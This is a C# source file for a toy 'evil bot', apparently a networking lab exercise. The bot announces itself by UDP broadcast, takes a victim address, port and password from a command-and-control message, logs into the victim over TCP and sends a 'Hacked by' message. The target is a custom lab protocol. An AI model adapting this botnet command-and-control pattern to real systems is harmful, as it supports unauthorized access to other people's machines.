using System;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;

namespace Bots
{
    class Bot
    {
        private Socket udpSocket;
        private UdpClient udpClient;
        private int ipLesteningPort;
        private readonly int _iUdpPortNumber;
        private Timer _timer;
        private IPAddress victim_address;
        private int portOfVictim;
        private String victimPassword;
        private Socket victimSocket;
        private String cNcName;
        private String szVictimPasswordRequest = "please enter your password" + Environment.NewLine;
        private String szAcessGranted = "access granted" + Environment.NewLine;
        private String szHackedMessege;
        private string _matchPasswordPattern = "([a-z]){6}";

        public Bot()
        {
            Console.Title = "The evil bot";
            /* Set console text color */
            Console.ForegroundColor = ConsoleColor.Magenta;
            _iUdpPortNumber = 31337;
        }
        public void Start()
        {
            ///*chose random udp port to listen*/
            InitializeUdpClient();

            ///*send bot announcement*/
            StartBroadcastWithTimer();
            //Console.WriteLine("listen");
            ///* listen to messege from cNc*/
            ListenToMessegeFromCnC();
            //Console.WriteLine("try to creat tcp");
            //victim_address = new IPAddress(StringIp("127.0.0.1"));
            //portOfVictim = 49152;
            //victimPassword = "pkgtcc";
            //cNcName = "mozes";
            //szHackedMessege = "Hacked by " + cNcName + Environment.NewLine;
            /*connect to victim with tcp*/
            CreateTcpConnection();
            //Console.WriteLine("success to creat tcp");
            /*comunicate with victem*/
            ComunicateWithVictim();
            //Console.WriteLine("success to creat tcp");
        }
        private void InitializeUdpClient()
        {
            udpClient = new UdpClient { ExclusiveAddressUse = false };
            udpClient.Client.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.ReuseAddress, true);
            try
            {
                udpClient.Client.Bind(new IPEndPoint(IPAddress.Any, 0));
                ipLesteningPort = ((IPEndPoint)udpClient.Client.LocalEndPoint).Port;
            }
            catch (Exception)
            {
                Console.WriteLine("Cannot bind to local port");
                InitializeUdpClient();
            }
            Console.WriteLine("Bot is listening on port " + (ipLesteningPort));
        }

        private void SendBroadcast()
        {

            /* Get a new open port for broadcast */
            byte[] portBigEndianBytes = IntToBinaryStr(ipLesteningPort);

            UdpClient client = new UdpClient(AddressFamily.InterNetwork) { DontFragment = true };

            /* Send the broadcast */
            client.Send(portBigEndianBytes, portBigEndianBytes.Length,
                new IPEndPoint(IPAddress.Broadcast, _iUdpPortNumber));

            /* Close the socket */
            client.Close();
        }
        private static byte[] IntToBinaryStr(int iNumber)
        {
            byte[] intBytes = BitConverter.GetBytes(iNumber);
            if (!BitConverter.IsLittleEndian) return intBytes;
            intBytes = new[] { (byte)(iNumber >> 8), (byte)iNumber };
            return intBytes;
        }

        private void StartBroadcastWithTimer(int dSecondsInterval = 10)
        {
            /* Start the timer thread */
            _timer = new Timer(e => SendBroadcast(), null, TimeSpan.Zero, TimeSpan.FromSeconds(dSecondsInterval));
        }

        private void ListenToMessegeFromCnC()
        {
            IPEndPoint remoteEndPoint = new IPEndPoint(IPAddress.Broadcast, ipLesteningPort);

            try
            {
                /* Listen for broadcast */
                byte[] receiveBytes = udpClient.Receive(ref remoteEndPoint);

                /* Extract the data of the victim from the messege the cNc send */
                victim_address = ExtractIpAdress(ref receiveBytes);
                portOfVictim = ExtractPort(ref receiveBytes);
                victimPassword = ExtractPassword(ref receiveBytes);
                cNcName = ExtractName(ref receiveBytes);

                ValidateClientData();

                /*update hacked messege*/
                szHackedMessege = "Hacked by " + cNcName + Environment.NewLine;
            }
            catch (Exception)
            {
                udpClient?.Close();
                Start();
            }
            finally
            {
                udpClient?.Close();
                Start();
            }
        }

        private bool ValidateClientData()
        {
            /* Validate the user ip address input */
            while (!ValidateUserIp()) ;

            /* Validate the user port input */
            while (!ValidateUserPort()) ;

            /* Validate the user password input */
            while (!ValidateUserPassword()) ;
            return true;
        }

        private bool ValidateUserIp()
        {
            IPAddress ip;
            return IPAddress.TryParse(victim_address.ToString(), out ip);
        }

        private bool ValidateUserPort()
        {
            return 0 <= portOfVictim;
        }

        private bool ValidateUserPassword()
        {
            if (6 != victimPassword.Length)
            {
                return false;
            }
            return Regex.IsMatch(victimPassword, _matchPasswordPattern);
        }
        private static int ExtractPort(ref byte[] receiveBytes)
        {
            byte[] victimPortBytes = { receiveBytes[4], receiveBytes[5] };
            if (BitConverter.IsLittleEndian)
                Array.Reverse(victimPortBytes);
            return BitConverter.ToUInt16(victimPortBytes, 0);
        }
        private static IPAddress ExtractIpAdress(ref byte[] receiveBytes)
        {

            byte[] victimIpAdressBytes = new byte[4];
            Buffer.BlockCopy(receiveBytes, 0, victimIpAdressBytes, 0, victimIpAdressBytes.Length);
            if (!BitConverter.IsLittleEndian)
                Array.Reverse(victimIpAdressBytes);
            //string szIpNotFiltered = Encoding.ASCII.GetString(victimIpAdressBytes);
            //string szIp = szIpNotFiltered.TrimEnd();
            //return IPAddress.Parse(szIp);
            return new IPAddress(victimIpAdressBytes);
        }
        private static String ExtractPassword(ref byte[] receiveBytes)
        {
            byte[] victimPasswprdBytes = new byte[6];
            Buffer.BlockCopy(receiveBytes, 6, victimPasswprdBytes, 0, victimPasswprdBytes.Length);
            if (!BitConverter.IsLittleEndian)
                Array.Reverse(victimPasswprdBytes);
            string szNameNotFiltered = Encoding.ASCII.GetString(victimPasswprdBytes);
            return szNameNotFiltered.TrimEnd();
        }
        private static string ExtractName(ref byte[] receiveBytes)
        {
            byte[] cNcNameBytes = new byte[32];
            Buffer.BlockCopy(receiveBytes, 12, cNcNameBytes, 0, cNcNameBytes.Length);
            if (!BitConverter.IsLittleEndian)
                Array.Reverse(cNcNameBytes);
            string szShipNameNotFiltered = Encoding.ASCII.GetString(cNcNameBytes);
            return szShipNameNotFiltered.TrimEnd();
        }

        private void CreateTcpConnection()
        {
            /* Socket to comuunicate with the server */
            victimSocket = new Socket(SocketType.Stream, ProtocolType.Tcp) { ReceiveTimeout = int.MaxValue };

            try
            {
                victimSocket.Connect(new IPEndPoint(victim_address, portOfVictim));
            }
            catch (Exception)
            {
                victimSocket.Close();
            }
        }

        private void ComunicateWithVictim()
        {
            try
            {
                /*recive password request messege*/
                byte[] serverMsgBytes = new byte[Encoding.ASCII.GetBytes(szVictimPasswordRequest).Length];
                int iRecvSize = victimSocket.Receive(serverMsgBytes);
                String messege = GetDataFromSocket(serverMsgBytes);

                /* Get the user Password Request without newline */
                //messege = messege?.Replace(Environment.NewLine, "");
                /*validte the recived messege*/
                if (!szVictimPasswordRequest.Equals(messege.ToLower()))
                {
                    Console.WriteLine("messege not equals password");
                    Reset();
                }

                /*send the password*/
                byte[] initialIncomeBytes = Encoding.ASCII.GetBytes(victimPassword);
                victimSocket.Send(initialIncomeBytes);

                /*recive accesss granted*/
                serverMsgBytes = new byte[Encoding.ASCII.GetBytes(szAcessGranted).Length];
                iRecvSize = victimSocket.Receive(serverMsgBytes);
                messege = GetDataFromSocket(serverMsgBytes);

                /* Get the user Acess Granted without newline */
                Console.WriteLine("the message I got is:" + messege);
                Console.ReadLine();
                /*validate access granted*/
                if (!szAcessGranted.Equals(messege.ToLower()))
                {
                    Console.WriteLine("messege not equals acess");
                    Reset();
                }
                Console.ReadLine();
                /*send Super C00l Hacked messege*/
                initialIncomeBytes = Encoding.ASCII.GetBytes(szHackedMessege);
                victimSocket.Send(initialIncomeBytes);
                Console.WriteLine("success");
                Reset();
            }
            catch (Exception)
            {
                Reset();
            }
        }

        private void Reset()
        {
            /* Close the victim connection */
            try
            {
                victimSocket.Shutdown(SocketShutdown.Both);
                victimSocket.Close();
            }
            catch (Exception)
            {
            }
            Start();
        }

        private string GetDataFromSocket(byte[] bytesInput)
        {
            int iRecvIncome = bytesInput.Length;
            byte[] byteBuffer = new byte[iRecvIncome];
            Array.Copy(bytesInput, byteBuffer, iRecvIncome);
            return Encoding.ASCII.GetString(byteBuffer);
        }

        private byte[] StringIp(string ip)
        {
            IPAddress adress = IPAddress.Parse(ip);
            Byte[] bytes = adress.GetAddressBytes();
            return bytes;

        }
    }
}
